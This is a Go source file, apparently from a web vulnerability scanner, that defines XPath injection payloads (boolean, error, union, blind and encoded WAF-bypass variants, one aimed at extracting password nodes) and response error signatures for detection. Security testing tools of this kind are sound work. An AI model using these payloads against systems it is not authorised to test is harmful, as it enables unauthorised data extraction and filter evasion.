// Package xpath provides payloads for XPath Injection detection.
package xpath

// InjectionType represents the type of XPath injection technique.
type InjectionType string

const (
	TypeBoolBased  InjectionType = "bool_based"
	TypeErrorBased InjectionType = "error_based"
	TypeUnionBased InjectionType = "union_based"
	TypeBlindBased InjectionType = "blind_based"
)

// Payload represents an XPath injection payload.
type Payload struct {
	Value       string
	Type        InjectionType
	Description string
	WAFBypass   bool
}

var payloads = []Payload{
	// Boolean-based detection
	{Value: "' or '1'='1", Type: TypeBoolBased, Description: "Always true string condition"},
	{Value: "' or '1'='1' or '1'='1", Type: TypeBoolBased, Description: "Double true condition"},
	{Value: "\" or \"1\"=\"1", Type: TypeBoolBased, Description: "Double quote true condition"},
	{Value: "' or 1=1 or '1'='1", Type: TypeBoolBased, Description: "Mixed quote true condition"},
	{Value: "') or ('1'='1", Type: TypeBoolBased, Description: "Parenthesis bypass true"},
	{Value: "' or ''='", Type: TypeBoolBased, Description: "Empty string comparison"},
	{Value: "1' or '1' = '1')/*", Type: TypeBoolBased, Description: "Comment bypass"},
	{Value: "' or true() or '", Type: TypeBoolBased, Description: "XPath true() function"},
	{Value: "' or string-length(name())>0 or '1'='1", Type: TypeBoolBased, Description: "String-length based probe"},

	// Error-based detection
	{Value: "'", Type: TypeErrorBased, Description: "Single quote to break XPath"},
	{Value: "\"", Type: TypeErrorBased, Description: "Double quote to break XPath"},
	{Value: "')", Type: TypeErrorBased, Description: "Close function with quote"},
	{Value: "']", Type: TypeErrorBased, Description: "Close predicate with quote"},
	{Value: "//", Type: TypeErrorBased, Description: "XPath axis separator"},
	{Value: "' and count(/)>0 and '1'='1", Type: TypeErrorBased, Description: "Count root nodes"},

	// Union/extraction based
	{Value: "' | //user/*", Type: TypeUnionBased, Description: "Union to extract user nodes"},
	{Value: "' | //*", Type: TypeUnionBased, Description: "Union to extract all nodes"},
	{Value: "'] | //password | a['", Type: TypeUnionBased, Description: "Extract password nodes"},
	{Value: "') or contains(name(),'pass') or ('", Type: TypeUnionBased, Description: "Contains name probe"},
	{Value: "' or name()='password' or '1'='1", Type: TypeUnionBased, Description: "Name equals probe"},

	// Blind-based (uses XPath functions)
	{Value: "' or substring(name(),1,1)='a' or '1'='1", Type: TypeBlindBased, Description: "Substring blind test"},
	{Value: "' or string-length(name())=1 or '1'='1", Type: TypeBlindBased, Description: "String-length blind test"},
	{Value: "' or starts-with(name(),'u') or '1'='1", Type: TypeBlindBased, Description: "Starts-with blind test"},

	// WAF bypass variants
	{Value: "%27%20or%20%271%27=%271", Type: TypeBoolBased, Description: "URL encoded true condition", WAFBypass: true},
	{Value: "&#39; or &#39;1&#39;=&#39;1", Type: TypeBoolBased, Description: "HTML entity encoded", WAFBypass: true},
	{Value: "' oR '1'='1", Type: TypeBoolBased, Description: "Mixed case OR", WAFBypass: true},
	{Value: "'||'1'='1", Type: TypeBoolBased, Description: "Pipe OR operator", WAFBypass: true},
}

// ErrorPatterns are XPath error patterns to look for in responses.
var ErrorPatterns = []string{
	"XPathException",
	"Invalid expression",
	"javax.xml.xpath",
	"XPathEvalError",
	"xmlXPathEval",
	"DOMXPath",
	"SimpleXMLElement",
	"XPath error",
	"xpath syntax error",
	"unterminated string",
	"invalid predicate",
	"XPATH syntax",
	"Expression must evaluate",
	"lxml.etree",
	"XPathParser",
}

// GetPayloads returns all XPath injection payloads.
func GetPayloads() []Payload {
	return payloads
}

// GetWAFBypassPayloads returns only WAF bypass payloads.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetByType returns payloads for a specific injection type.
func GetByType(injType InjectionType) []Payload {
	var result []Payload
	for _, p := range payloads {
		if p.Type == injType {
			result = append(result, p)
		}
	}
	return result
}

// GetErrorPatterns returns XPath error patterns.
func GetErrorPatterns() []string {
	return ErrorPatterns
}
